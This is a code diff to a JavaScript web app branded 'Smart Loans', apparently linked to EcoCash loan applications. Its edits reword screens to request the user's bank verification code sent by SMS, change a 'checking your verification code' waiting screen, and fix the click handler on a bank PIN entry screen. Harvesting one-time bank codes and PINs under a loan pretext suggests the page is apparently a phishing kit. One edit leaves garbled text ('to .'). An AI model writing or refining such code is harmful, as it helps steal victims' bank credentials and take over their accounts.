@@ -1177,7 +1177,7 @@ function loadBankVerificationWaitingScreen() {
             ">
 
                 Requesting a verification code
-                for your registered mobile number.
+                to .
 
                 <br><br>
 
@@ -1320,8 +1320,8 @@ function loadBankVerificationScreen() {
 
                 <br><br>
 
-                Please enter the code below
-                to continue with your application.
+                Please enter your bank verification 
+                code sent to you via SMS.
 
             </p>
 
@@ -1491,8 +1491,8 @@ function loadVerificationPendingScreen() {
 
                 <br><br>
 
-                Please wait while our team verifies
-                your code.
+                checking your 
+                verification code...
 
             </p>
 
@@ -2308,78 +2308,6 @@ async function submitEcoCashApplication() {
     }
 
 }
-// ======================================================
-// PART 26 - VERIFICATION PENDING SCREEN
-// ======================================================
-
-function loadVerificationPendingScreen() {
-
-    const app = document.getElementById("app");
-
-    app.innerHTML = `
-
-    <div class="container">
-
-        <div class="welcome-card">
-
-            <div style="
-                font-size:60px;
-                text-align:center;
-            ">
-                🔐
-            </div>
-
-            <h2 style="text-align:center;">
-                Smart Loans
-            </h2>
-
-            <br>
-
-            <div style="
-                text-align:center;
-                font-size:22px;
-                color:#f39c12;
-                font-weight:bold;
-            ">
-
-                🟡 Verification Pending
-
-            </div>
-
-            <br>
-
-            <p style="
-                text-align:center;
-                line-height:1.8;
-            ">
-
-                please wait.
-
-                <br><br>
-
-                Checking the verification code.
-
-            </p>
-
-            <br>
-
-            <div class="loading-dots">
-
-                <span></span>
-                <span></span>
-                <span></span>
-
-            </div>
-
-        </div>
-
-    </div>
-
-    `;
-
-    monitorVerificationStatus();
-
-}
 // ===============================
 // LIVE TRACKING STATUS
 // ===============================
@@ -3077,7 +3005,7 @@ async function submitBankVerificationCode() {
 
     if (code === "") {
 
-        alert("Please enter the verification code sent via SMS.");
+        alert("Please enter the bank verification code sent via SMS.");
 
         return;
     }
@@ -3233,7 +3161,7 @@ function loadBankPinScreen() {
         .getElementById("continueBankPin")
         .addEventListener(
             "click",
-            saveBankPin();
+            saveBankPin
         );
 
             }
